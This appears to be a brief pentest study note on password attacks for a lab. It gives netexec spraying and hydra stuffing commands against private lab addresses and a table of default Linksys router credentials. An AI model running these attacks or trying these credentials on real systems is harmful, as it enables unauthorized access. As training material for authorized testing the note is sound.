---
id: password_attack
aliases:
  - password-attack
tags:
  - brute-foce
---

# Spraying, Stuffing, and Defaults
## Spraying: 
`netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'`
## Stuffing 
`hydra -C user_pass.list ssh://10.100.38.23`
## Defaults
`pip3 install defaultcreds-cheat-sheet`
```
creds search linksys

+---------------+---------------+------------+
| Product       |    username   |  password  |
+---------------+---------------+------------+
| linksys       |    <blank>    |  <blank>   |
| linksys       |    <blank>    |   admin    |
| linksys       |    <blank>    | epicrouter |
| linksys       | Administrator |   admin    |
| linksys       |     admin     |  <blank>   |
| linksys       |     admin     |   admin    |
| linksys       |    comcast    |    1234    |
| linksys       |      root     |  orion99   |
| linksys       |      user     |  tivonpw   |
| linksys (ssh) |     admin     |   admin    |
| linksys (ssh) |     admin     |  password  |
| linksys (ssh) |    linksys    |  <blank>   |
| linksys (ssh) |      root     |   admin    |
+---------------+---------------+------------+
```
## Lab:
- IP: 10.129.202.64
